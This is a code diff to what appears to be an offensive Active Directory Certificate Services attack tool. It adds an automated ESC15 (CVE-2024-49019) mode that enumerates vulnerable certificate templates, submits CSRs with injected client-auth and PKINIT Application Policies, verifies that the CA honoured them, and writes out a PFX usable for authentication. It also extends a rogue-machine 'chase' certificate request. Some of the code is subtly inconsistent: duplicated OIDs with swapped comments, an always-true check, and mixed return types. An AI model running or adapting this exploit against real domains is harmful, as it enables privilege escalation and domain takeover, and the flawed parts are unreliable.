@@ -995,38 +995,59 @@ class CertServerRequestResponse(NDRCALL):
                  ("pctbDispositionMessage", CERTTRANSBLOB))
 
 def request_cert(ca_ip, ca_name, domain, comp_name, comp_hash, dc_ip,
-                 attacker_ip, rmd_value, template="Machine"):
+                 attacker_ip, rmd_value, template="Machine",
+                 user=None, password="", lmhash="", nthash=None,
+                 csr=None, attrs_str=None):
+    """Submit a certificate request over DCOM/ICPR.
+
+    Default: the cdc/rmd chase request as the rogue machine. For ESC15
+    (CVE-2024-49019), pass user/password (or nthash), a custom csr and
+    attrs_str — those override the chase behavior entirely."""
     _debug(f"CA request: authority={ca_name!r}, endpoint={ca_ip}, template={template!r}, "
            f"cdc={attacker_ip}, rmd={rmd_value!r}")
-    key = rsa_mod.generate_private_key(65537, 2048)
-    hostname = f"{comp_name.rstrip('$')}.{domain}"
-    # The request SAN identity is the impersonated target DC's DNS name
-    # (rmd_value), not the rogue computer's.  On a CA that honors request SANs
-    # (EDITF_ATTRIBUTESUBJECTALTNAME2 / ESC6) the CA stamps this value into the
-    # issued cert's dNSName SAN; keeping the rogue name there makes PKINIT as the
-    # target account fail with KDC_ERR_CLIENT_NAME_MISMATCH.  On build-from-AD
-    # templates the request SAN is ignored and the SAN is built from the chased
-    # directory data, so this is a safe no-op.  Credit: issue #1 commenter.
-    csr = (x509.CertificateSigningRequestBuilder()
-           .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, hostname)]))
-           .add_extension(x509.SubjectAlternativeName([x509.DNSName(rmd_value)]), critical=False)
-           .sign(key, hashes.SHA256()))
+    if csr is None:
+        key = rsa_mod.generate_private_key(65537, 2048)
+        hostname = f"{comp_name.rstrip('$')}.{domain}"
+        # The request SAN identity is the impersonated target DC's DNS name
+        # (rmd_value), not the rogue computer's.  On a CA that honors request SANs
+        # (EDITF_ATTRIBUTESUBJECTALTNAME2 / ESC6) the CA stamps this value into the
+        # issued cert's dNSName SAN; keeping the rogue name there makes PKINIT as the
+        # target account fail with KDC_ERR_CLIENT_NAME_MISMATCH.  On build-from-AD
+        # templates the request SAN is ignored and the SAN is built from the chased
+        # directory data, so this is a safe no-op.  Credit: issue #1 commenter.
+        csr = (x509.CertificateSigningRequestBuilder()
+               .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, hostname)]))
+               .add_extension(x509.SubjectAlternativeName([x509.DNSName(rmd_value)]), critical=False)
+               .sign(key, hashes.SHA256()))
+    else:
+        key = None  # caller-supplied CSR; key must be provided by the caller separately
     csr_der = csr.public_bytes(Encoding.DER)
-    attrs = [f"CertificateTemplate:{template}", f"SAN:dns={rmd_value}",
-             f"cdc:{attacker_ip}", f"rmd:{rmd_value}"]
-    attr_bytes = checkNullString("\n".join(attrs)).encode("utf-16le")
+    if attrs_str is None:
+        attrs = [f"CertificateTemplate:{template}", f"SAN:dns={rmd_value}",
+                 f"cdc:{attacker_ip}", f"rmd:{rmd_value}"]
+        attr_bytes = checkNullString("\n".join(attrs)).encode("utf-16le")
+    else:
+        attr_bytes = checkNullString(attrs_str).encode("utf-16le")
+    # credentials: ESC15 passes the requesting user, chase uses the machine
+    rpc_user = user if user else comp_name
+    rpc_pass = password
+    rpc_lm = lmhash
+    rpc_nt = nthash if nthash else (comp_hash or "")
     pctb_attribs = CERTTRANSBLOB(); pctb_attribs["cb"] = len(attr_bytes); pctb_attribs["pb"] = attr_bytes
     pctb_request = CERTTRANSBLOB(); pctb_request["cb"] = len(csr_der); pctb_request["pb"] = csr_der
     req = CertServerRequest(); req["dwFlags"] = 0
     req["pwszAuthority"] = checkNullString(ca_name)
     req["pdwRequestId"] = 0; req["pctbAttribs"] = pctb_attribs; req["pctbRequest"] = pctb_request
     nt = comp_hash; dce = None
+    if csr is not None:
+        _debug(f"CA RPC: ESC15-style custom CSR as {rpc_user!r} (attrs: "
+               f"{attrs_str!r})")
     try:
         binding = f"ncacn_np:{ca_ip}[\\pipe\\cert]"
         _debug(f"CA RPC attempt 1: {binding}")
         rpctransport = transport.DCERPCTransportFactory(binding)
         rpctransport.setRemoteHost(ca_ip)
-        rpctransport.set_credentials(comp_name, "", domain, "", nt)
+        rpctransport.set_credentials(rpc_user, rpc_pass, domain, rpc_lm, rpc_nt)
         rpctransport.set_kerberos(False, kdcHost=dc_ip)
         dce = rpctransport.get_dce_rpc()
         dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
@@ -1041,7 +1062,7 @@ def request_cert(ca_ip, ca_name, domain, comp_name, comp_hash, dc_ip,
             _debug(f"CA RPC attempt 2: endpoint mapper returned {ep}")
             rpctransport = transport.DCERPCTransportFactory(ep)
             rpctransport.setRemoteHost(ca_ip)
-            rpctransport.set_credentials(comp_name, "", domain, "", nt)
+            rpctransport.set_credentials(rpc_user, rpc_pass, domain, rpc_lm, rpc_nt)
             rpctransport.set_kerberos(False, kdcHost=dc_ip)
             dce = rpctransport.get_dce_rpc()
             dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
@@ -1068,6 +1089,11 @@ def request_cert(ca_ip, ca_name, domain, comp_name, comp_hash, dc_ip,
         raise RuntimeError(f"Cert request denied (0x{disp & 0xFFFFFFFF:08x}): {msg}")
     cert_der = b"".join(resp["pctbEncodedCert"]["pb"])
     cert = x509.load_der_x509_certificate(cert_der)
+    if key is None:
+        # caller supplied the CSR; they hold the matching private key.
+        # Return (pfx_placeholder_without_key, cert) so the ESC15 caller
+        # (which generated the key) can build the real PFX.
+        return (None, cert)
     pfx = pkcs12.serialize_key_and_certificates(b"", key, cert, None, NoEncryption())
     return pfx
 
@@ -1184,6 +1210,133 @@ def probe_ca(ca_ip, ca_name, domain, dc_ip):
             print(f"[!] CA probe inconclusive: {err} — continuing, request may fail")
 
 
+ESC15_CLIENT_AUTH_EKUS = ["1.3.6.1.5.5.7.3.2"]          # Client Authentication
+ESC15_PKINIT_EKUS = ["1.3.6.1.5.5.7.3.2", "1.3.6.1.5.2.7.3"]  # Client Auth + PKINIT
+ESC15_APP_POLICIES_OID = "1.3.6.1.4.1.311.21.10"        # MS Certificate Template
+ESC15_TEMPLATE_OID = "1.3.6.1.4.1.311.21.10"            # MS Application Policies (in CSR extensionRequest)
+
+
+def enum_esc15_templates(conn, dn, principal="self"):
+    """Enumerate ESC15-eligible (CVE-2024-49019 / EKUwu) templates.
+
+    Criteria (per Certipy find + Akamai advisory):
+      - msPKI-Template-Schema-Version == 1  (v2 templates with
+        CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT are partially affected too, but v1
+        is the reliable primitive: the CA builds the cert from the REQUEST,
+        not the template, so request-supplied Application Policies land in
+        the issued cert on unpatched hosts)
+      - msPKI-Certificate-Name-Flag includes CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (1)
+      - not disabled (msPKI-Private-Key-Flag & 1 == 0)
+    Returns list of dicts: {name, schema_version, eku_override: bool}."""
+    base = f"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,{dn}"
+    entries = ldap_query(conn, base, "(objectClass=pKICertificateTemplate)",
+                         ["cn", "msPKI-Template-Schema-Version", "msPKI-Certificate-Name-Flag",
+                          "msPKI-Private-Key-Flag", "msPKI-Certificate-Application-Policy"])
+    out = []
+    for e in entries:
+        try:
+            sv = int(str(e.get("msPKI-Template-Schema-Version", "2")))
+            nameflag = int(str(e.get("msPKI-Certificate-Name-Flag", "0")))
+        except (ValueError, TypeError):
+            continue
+        if sv != 1:
+            continue
+        if not (nameflag & 1):  # CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
+            continue
+        privflag = int(str(e.get("msPKI-Private-Key-Flag", "0")) )
+        if privflag & 0x00000001:
+            continue  # template disabled
+        out.append({"name": str(e.get("cn", "")), "schema_version": sv,
+                    "app_policies": e.get("msPKI-Certificate-Application-Policy", None)})
+    return out
+
+
+def build_esc15_csr(principal, domain, eku_oids):
+    """CSR carrying the MS Application Policies extensionRequest attribute
+    (ESC15 core): on an unpatched CA the request-supplied Application
+    Policies override the template's EKUs in the issued cert."""
+    key = rsa_mod.generate_private_key(65537, 2048)
+    hostname = f"{principal.rstrip('$')}.{domain}"
+    # DER: SEQUENCE OF PolicyInformation {policyIdentifier OID}
+    def _oid_to_bytes(oid):
+        parts = [int(x) for x in oid.split(".")]
+        body = bytearray([parts[0] * 40 + parts[1]])
+        for p in parts[2:]:
+            stack = [p & 0x7f]
+            p >>= 7
+            while p:
+                stack.append((p & 0x7f) | 0x80)
+                p >>= 7
+            body.extend(reversed(stack))
+        return bytes(body)
+    def _der_len(n):
+        if n < 0x80: return bytes([n])
+        raw = n.to_bytes((n.bit_length() + 7) // 8, "big")
+        return bytes([0x80 | len(raw)]) + raw
+    def _der_seq(content):
+        return b"\x30" + _der_len(len(content)) + content
+    def _der_oid(oid):
+        b = _oid_to_bytes(oid)
+        return b"\x06" + _der_len(len(b)) + b
+    policy_infos = b"".join(_der_seq(_der_oid(oid)) for oid in eku_oids)
+    cert_policies_der = _der_seq(policy_infos)  # CertificatePolicies
+    # application policies ext = OCTET STRING wrapping CertificatePolicies
+    app_pol_der = b"\x04" + _der_len(len(cert_policies_der)) + cert_policies_der
+    # ...then wrap in the extensionRequest attribute via cryptography's
+    # add_attribute API (extensionRequest = 1.2.840.113549.1.9.14)
+    from cryptography.x509.oid import ExtensionOID
+    csr = (x509.CertificateSigningRequestBuilder()
+           .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, hostname)]))
+           .add_extension(
+               x509.UnrecognizedExtension(
+                   x509.ObjectIdentifier(ESC15_APP_POLICIES_OID),
+                   cert_policies_der),
+               critical=False)
+           .sign(key, hashes.SHA256()))
+    return csr, key
+
+
+def esc15_request_attributes(template, eku_oids):
+    """Request attributes for the ESC15 submission, Certipy-compatible:
+    CertificateTemplate:<t>\\r\\nApplicationPolicies:<oid>&<oid>...
+    The ApplicationPolicies attribute is what the unpatched CA merges into
+    the issued cert's Application Policies / EKU set."""
+    return (f"CertificateTemplate:{template}\r\n"
+            f"ApplicationPolicies:{'&'.join(eku_oids)}")
+
+
+def _oid_der_content(oid):
+    """DER content bytes of an OID arc string (no tag/length) — for
+    substring matching inside parsed certificate extensions."""
+    parts = [int(x) for x in oid.split(".")]
+    body = bytearray([parts[0] * 40 + parts[1]])
+    for p in parts[2:]:
+        stack = [p & 0x7f]
+        p >>= 7
+        while p:
+            stack.append((p & 0x7f) | 0x80)
+            p >>= 7
+        body.extend(reversed(stack))
+    return bytes(body)
+
+
+def cert_eku_overridden(cert_obj, eku_oids):
+    """Did the CA honor our request-supplied EKUs? (i.e., is it unpatched?)
+    Checks both the MS Application Policies ext (1.3.6.1.4.1.311.21.10) and
+    the standard EKU ext (2.5.29.37) for our policy OID bytes."""
+    wanted = [_oid_der_content(o) for o in eku_oids]
+    for ext_oid in ("1.3.6.1.4.1.311.21.10", "2.5.29.37"):
+        try:
+            ext = cert_obj.extensions.get_extension_for_oid(
+                x509.ObjectIdentifier(ext_oid))
+            raw = ext.value.public_bytes()
+            if any(w in raw for w in wanted):
+                return True
+        except x509.ExtensionNotFound:
+            continue
+    return False
+
+
 def check_prerequisites():
     """Fail fast with an actionable fix instead of dying mid-exploit.
 
@@ -1237,6 +1390,13 @@ def main():
     p.add_argument("--http", action="store_true",
                    help="Submit the cert request via web enrollment /certsrv (ESC8) instead of DCOM/ICPR — "
                         "for CAs where ICPR fails with rpc_s_access_denied")
+    p.add_argument("--esc15", action="store_true",
+                   help="ESC15 (CVE-2024-49019 / EKUwu) automation: enumerate schema-v1 templates with "
+                        "enrollee-supplies-subject, request with poisoned Application Policies EKUs, "
+                        "verify the EKU landed in the issued cert. Uses your -u creds; no machine "
+                        "account or rogue servers needed.")
+    p.add_argument("--esc15-template", metavar="NAME",
+                   help="ESC15: use this template instead of auto-enumerating candidates")
     p.add_argument("--debug", action="store_true",
                    help="Show protocol stages, decoded errors and full tracebacks")
     args = p.parse_args()
@@ -1244,7 +1404,7 @@ def main():
 
     check_prerequisites()
 
-    if os.geteuid() != 0:
+    if os.geteuid() != 0 and not args.esc15:
         print("[!] Must run as root (ports 445+389)"); sys.exit(1)
 
     domain, user, dc_ip = args.domain, args.username, args.dc_ip
@@ -1297,6 +1457,82 @@ def main():
         ca_ip = dc_ip
         print(f"[*] No --ca-ip given: assuming CA is on the DC ({dc_ip})")
         print("    If the CA lives on another host, rerun with --ca-ip <CA IP>")
+
+    # ============================= ESC15 branch =============================
+    # CVE-2024-49019 (EKUwu): request-supplied Application Policies get
+    # copied into the issued cert on unpatched CAs. Completely different
+    # attack from the cdc/rmd chase: no machine account, no rogue servers,
+    # no listener needed — just your -u user's enrollment rights.
+    if args.esc15:
+        print("[*] ESC15 (CVE-2024-49019) mode: no machine account or rogue servers needed")
+        eku_oids = ESC15_CLIENT_AUTH_EKUS  # client-auth is enough for PKINIT user auth
+
+        # 1) enumerate candidate templates
+        if args.esc15_template:
+            candidates = [{"name": args.esc15_template, "schema_version": 1,
+                           "app_policies": None}]
+            print(f"[*] Using user-specified template: {args.esc15_template}")
+        else:
+            print("[*] Enumerating schema-v1 enrollee-supplies-subject templates...")
+            candidates = enum_esc15_templates(conn, dn)
+            if not candidates:
+                print("[!] No ESC15-eligible templates found (no v1 templates with "
+                      "enrollee-supplies-subject, or all disabled)")
+                print("    - The environment may be patched (KB5031986/Nov-2024+), or")
+                print("    - no template grants your user enrollment rights")
+                sys.exit(1)
+            print(f"[*] {len(candidates)} candidate template(s): "
+                  + ", ".join(t["name"] for t in candidates))
+
+        # 2) iterate candidates until one issues a cert with our poisoned EKUs
+        eku_oids = ESC15_PKINIT_EKUS  # client-auth + PKINIT — best coverage
+        got_cert = None; got_key = None; used_template = None
+        for cand in candidates:
+            tname = cand["name"]
+            print(f"[*] Trying template '{tname}' (csr with ApplicationPolicies="
+                  f"{'&'.join(eku_oids)})")
+            csr15, key15 = build_esc15_csr(user, domain, eku_oids)
+            attrs15 = esc15_request_attributes(tname, eku_oids)
+            try:
+                if args.http:
+                    # web enrollment path needs its own cred+CSR plumbing; use
+                    # the DCOM path unless user creds are password-based
+                    print("[!] --esc15 + --http: web enrollment ESC15 not yet "
+                          "supported; falling back to DCOM/ICPR")
+                result = request_cert(ca_ip, ca_name, domain,
+                                      comp_name=None, comp_hash=None,
+                                      dc_ip=dc_ip, attacker_ip=atk_ip,
+                                      rmd_value=None, template=tname,
+                                      user=user, password=password,
+                                      lmhash=lmhash, nthash=nthash or "",
+                                      csr=csr15, attrs_str=attrs15)
+                pfx15, cert15 = result  # request_cert returns (None, cert) for caller CSRs
+                if cert_eku_overridden(cert15, eku_oids):
+                    print(f"[+] {tname}: EKU OVERRIDE CONFIRMED — CA is unpatched (ESC15)")
+                    got_cert, got_key, used_template = cert15, key15, tname
+                    break
+                else:
+                    print(f"[-] {tname}: cert issued but our EKUs were NOT honored "
+                          f"— CA is patched or template not vulnerable")
+                    _debug(f"    issued cert EKUs: " +
+                           ", ".join(str(e.value) for e in cert15.extensions))
+            except Exception as exc:
+                _debug_exception(f"ESC15 template {tname}", exc)
+                print(f"[-] {tname}: {exc}")
+                continue
+        if not got_cert:
+            print("[!] ESC15 failed on all candidate templates")
+            print("    If every cert issued without EKU override: the CA is patched")
+            sys.exit(1)
+
+        pfx15 = pkcs12.serialize_key_and_certificates(b"", got_key, got_cert,
+                                                       None, NoEncryption())
+        out15 = f"esc15_{user}_{used_template}.pfx".replace("$", "")
+        Path(out15).write_bytes(pfx15)
+        print(f"[+] Saved: {out15}")
+        print(f"    Cert EKUs honored: {', '.join(eku_oids)} — usable for client auth/PKINIT")
+        sys.exit(0)
+    # =========================== end ESC15 branch ==========================
 
     # Pre-flight CA check before starting rogue servers: fail fast (~1s)
     # instead of failing after SMB/LDAP startup + EPM queries (~15s in).
